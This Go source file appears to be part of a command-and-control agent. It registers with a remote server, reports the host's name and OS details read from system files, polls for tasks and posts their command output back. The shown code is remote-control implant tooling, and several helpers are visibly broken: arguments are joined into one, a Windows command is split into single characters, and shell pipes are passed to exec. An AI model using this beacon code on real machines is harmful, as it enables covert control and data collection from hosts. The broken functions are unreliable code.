package main

// https://grugbrain.dev/
// i am not sure grug understand go networking goodly
// but grug try best

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"

	"github.com/imroc/req/v3"
)

func register(baseurl string) string {
	log.Printf("%s", "Registering with server at "+baseurl)

	client := req.C()
	var result RegisterResult

	var myInfo = ClientInfo{Hostname: GetHostname(), OS: runtime.GOOS, OSName: GetOSSubtype()}

	resp, err := client.R().
		SetBody(&myInfo).
		SetSuccessResult(&result).
		Post(baseurl + "/register")
	if err != nil {
		log.Fatal(err)
	}

	if !resp.IsSuccessState() {
		// TODO: logger.fatal
		fmt.Println("bad response status:", resp.Status)
		fmt.Println("body:", resp.String())
		log.Fatalf("register failed")
		return "Failure"
	}
	// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++")
	// fmt.Printf("++++ agent_id: %s\n", result.AgentID)
	// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++")

	return result.AgentID

}

func checkin(baseurl string, agentid string) TaskResult {
	//log.Printf("Checking with server at " + baseurl)
	client := req.C()
	var result TaskResult
	post, err := client.R().
		SetSuccessResult(&result).
		Post(baseurl + "checkin?agentid=" + agentid)
	if err != nil {
		log.Fatal(err)
		return nil
	}

	if !post.IsSuccessState() {
		// TODO: logger.fatal
		fmt.Println("bad response status:", post.Status)
		fmt.Println("body:", post.String())
		log.Fatalf("register failed")
		return nil
	}

	return result
}

func submitTaskResult(baseurl string, agentID string, task Task) PostResultReply {
	client := req.C()
	var presult PostResultReply
	payload := cloneTask(task)
	payload["agent_id"] = agentID
	post, err := client.R().
		SetSuccessResult(&presult).
		SetBody(&payload).
		Post(baseurl + "post_result")
	if err != nil {
		log.Fatal(err)
		return nil
	}

	if !post.IsSuccessState() {
		fmt.Println("bad response status:", post.Status)
		fmt.Println("body:", post.String())
		log.Fatalf("status reply failed")
	}

	return presult
}

func formatTask(task Task) string {
	return fmt.Sprintf(
		"task_id=%s assigned_at=%s instruction=%s arg=%s exit_code=%s stdout=%s stderr=%s stopped_processing_at=%s responded=%s",
		taskValue(task, "task_id"),
		taskValue(task, "assigned_at"),
		taskValue(task, "instruction"),
		taskValue(task, "arg"),
		taskValue(task, "exit_code"),
		taskValue(task, "stdout"),
		taskValue(task, "stderr"),
		taskValue(task, "stopped_processing_at"),
		taskValue(task, "responded"),
	)
}

func taskValue(task Task, key string) string {
	val, ok := task[key]
	if !ok || val == nil {
		return "<nil>"
	}
	switch v := val.(type) {
	case string:
		return v
	case float64:
		if v == float64(int64(v)) {
			return fmt.Sprintf("%d", int64(v))
		}
		return fmt.Sprintf("%f", v)
	case bool:
		return fmt.Sprintf("%t", v)
	default:
		return fmt.Sprintf("%v", v)
	}
}

func updateTaskValue(task Task, key string, val any) Task {
	task[key] = val
	return task
}

func SaveAgentID(path string, id string) bool {
	err := os.WriteFile(path, []byte(id), 0644)
	if err != nil {
		return false
	}
	return true
}

func GetCommandOutput(command []string) string {

	var prog string = command[0]
	var rest []string = command[1:]

	cmd := exec.Command(prog, strings.Join(rest, " "))

	// Execute the command and capture its standard output
	output, err := cmd.Output()
	if err != nil {
		log.Fatalf("Error executing command: %v", err)
	}

	return string(output)

}

func GetHostname() string {
	switch runtime.GOOS {
	case "windows":
		return GetCommandOutput(strings.Split("hostname", " "))
	case "linux":
		return strings.TrimSpace(GetCommandOutput(strings.Split("cat /etc/hostname", " ")))
	}

	return "{something went wrong}"
}

func GetOSSubtype() string {
	switch runtime.GOOS {
	case "windows":
		var blorp string = GetCommandOutput(strings.Split("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", ""))
		var re = regexp.MustCompile(`(?m)\d\d \w\w\w`)
		var res = re.FindString(blorp)

		return res

	case "linux":
		if _, err := os.Stat("/etc/os-release"); err != nil {
			// TODO: could try checking lsb release or redhat release
			return "Uknown"
		}
		var glorp string = GetCommandOutput(strings.Split("cat /etc/os-release", " "))
		var redistro = regexp.MustCompile(`(?m)\bNAME="\w*`)
		var distro = strings.Replace(redistro.FindString(glorp), "NAME=\"", "", 1)
		var rerel = regexp.MustCompile(`(?m)\bBUILD_ID=\w*`)
		var release = strings.Replace(rerel.FindString(glorp), "BUILD_ID=", "", 1)

		return distro + " " + release
	}

	return "{confused in this empty place}"
}

func cloneTask(task Task) Task {
	result := make(Task, len(task))
	for k, v := range task {
		result[k] = v
	}
	return result
}
